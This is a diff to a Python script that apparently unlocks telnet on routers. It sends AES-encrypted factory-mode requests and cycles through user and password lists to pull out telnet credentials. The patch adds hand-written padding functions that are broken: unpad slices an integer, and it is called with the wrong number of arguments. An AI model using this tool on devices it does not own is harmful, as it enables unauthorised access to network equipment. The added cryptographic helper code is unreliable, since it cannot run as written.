@@ -4,7 +4,19 @@ import requests
 import argparse
 from random import Random
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+
+
+def pad(data_to_pad, block_size):
+    # zero-pad
+
+    padding_len = block_size-len(data_to_pad) % block_size
+    return data_to_pad+b'\x00'*padding_len
+
+
+def unpad(padded_data, block_size):
+    # zero-unpad, only work for null terminated string
+
+    return padded_data[:-block_size] + block_size[-block_size:].rstrip(b'\x00')
 
 
 class WebFac:
@@ -67,7 +79,7 @@ class WebFac:
             resp = self.S.post(f"http://{self.ip}:{self.port}/webFac", data=f'SendSq.gch?rand={rand}\r\n')
             if resp.status_code != 200:
                 return False
-            print(repr(resp.text))
+            # print(repr(resp.text))
 
             if len(resp.content) == 0:
                 index = rand
@@ -100,7 +112,6 @@ class WebFac:
 
     def sendInfo(self):
         try:
-            # take from time seconds, range 0-59
             resp = self.S.post(f"http://{self.ip}:{self.port}/webFacEntry",
                                data=self.chiper.encrypt(pad(f'SendInfo.gch?info=6|'.encode(), 16)))
             print(resp.status_code, repr(resp.text))
@@ -124,7 +135,7 @@ class WebFac:
             print(repr(resp.text))
             if resp.status_code == 200:
                 # resp should be "FactoryMode.gch"
-                url = self.chiper.decrypt(resp.content)
+                url = unpad(self.chiper.decrypt(pad(resp.content, 16)))
                 return url
             elif resp.status_code == 400:
                 print("protocol error")
@@ -176,7 +187,7 @@ class WebFacTelnet(WebFac):
                     data=self.chiper.encrypt(
                         pad(f'FactoryMode.gch?mode=2&user=notused'.encode(), 16)
                     ))
-            print(repr(resp.text))
+            # print(repr(resp.text))
             if resp.status_code == 200:
                 # resp should be "FactoryModeAuth.gch?user=<telnetuser>&pass=<telnetpass>"
                 url = self.chiper.decrypt(resp.content)
@@ -247,16 +258,18 @@ def dealTelnet(ip, port, users, pws, action):
                     print("sendInfo error")
                     return
                 print("\nfacStep 4:")
-                if not telnet.checkLoginAuth():
+                url = telnet.checkLoginAuth()
+                if not url:
                     print("try next...\n")
                     continue
+                print(repr(url))
             else:
                 pass
 
             print("\nfacStep 5:")
             url = telnet.factoryMode(action)
             if url:
-                print(telnet.factoryMode(action))
+                print(repr(url))
                 return
 
 
